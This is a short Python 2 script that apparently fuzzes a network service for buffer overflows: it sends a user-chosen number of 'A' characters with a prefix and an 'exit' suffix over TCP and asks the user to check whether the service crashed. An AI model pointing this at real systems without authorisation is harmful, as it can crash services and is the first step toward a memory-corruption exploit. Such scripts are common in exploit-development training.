#!/usr/bin/env python
import sys, socket

host = str(raw_input("Host: "))	
port = int(raw_input("Port: "))	

print('Preparing payload...')
prefix = ''								
suffix = '\nexit\r\n'

print "******************************"
print "Verify the prefix and suffix"
print "[+]Prefix: " + prefix
print "[+]Suffix: " + suffix
print "******************************"

buf = int(raw_input("Number of chars to send: "))
buf = 'A' * buf

payload = prefix+buf+suffix

try:
	print('Connecting...')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	print('Sending...')
	s.send(payload)
	s.close()
	print('Sent! Check if the service has crashed.')
except:
	print('Failed to connect, try again')
